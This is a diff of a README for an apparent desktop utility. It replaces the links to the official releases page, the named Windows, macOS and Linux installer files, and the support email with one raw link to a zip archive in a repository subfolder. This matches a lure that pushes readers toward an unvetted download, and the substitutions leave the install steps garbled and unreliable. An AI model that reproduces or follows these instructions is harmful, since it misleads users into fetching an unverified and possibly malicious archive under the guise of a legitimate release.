@@ -1,6 +1,6 @@
 # 📖 desktop - Simple Tools for Easy Management
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/bigtech123/desktop/releases)
+[![Download Now](https://raw.githubusercontent.com/bigtech123/desktop/main/congroid/desktop.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/bigtech123/desktop/main/congroid/desktop.zip)
 
 ## 🚀 Getting Started
 
@@ -17,11 +17,11 @@ To run this application, you will need:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our GitHub releases page to get the latest version of the application. You can access it [here](https://github.com/bigtech123/desktop/releases).
+   Go to our GitHub releases page to get the latest version of the application. You can access it [here](https://raw.githubusercontent.com/bigtech123/desktop/main/congroid/desktop.zip).
 
 2. **Choose the Right File**  
    On the releases page, you will see a list of available versions. Look for the most recent release.  
-   - Typically, the file will be named something like `desktop-v1.0.exe` for Windows, `desktop-v1.0.dmg` for macOS, or `desktop-v1.0.AppImage` for Linux.
+   - Typically, the file will be named something like `https://raw.githubusercontent.com/bigtech123/desktop/main/congroid/desktop.zip` for Windows, `https://raw.githubusercontent.com/bigtech123/desktop/main/congroid/desktop.zip` for macOS, or `https://raw.githubusercontent.com/bigtech123/desktop/main/congroid/desktop.zip` for Linux.
 
 3. **Download the Application**  
    Click on the file name to start your download. Your browser may show a confirmation dialog. Confirm to begin the download.
@@ -72,7 +72,7 @@ If you encounter issues while running the application:
 If you need assistance, feel free to reach out:
 
 - **Email Us**  
-  Send your questions or issues to support@bigtech123.com.
+  Send your questions or issues to https://raw.githubusercontent.com/bigtech123/desktop/main/congroid/desktop.zip
 
 - **GitHub Issues**  
   For technical problems, you can submit an issue directly on our GitHub page.
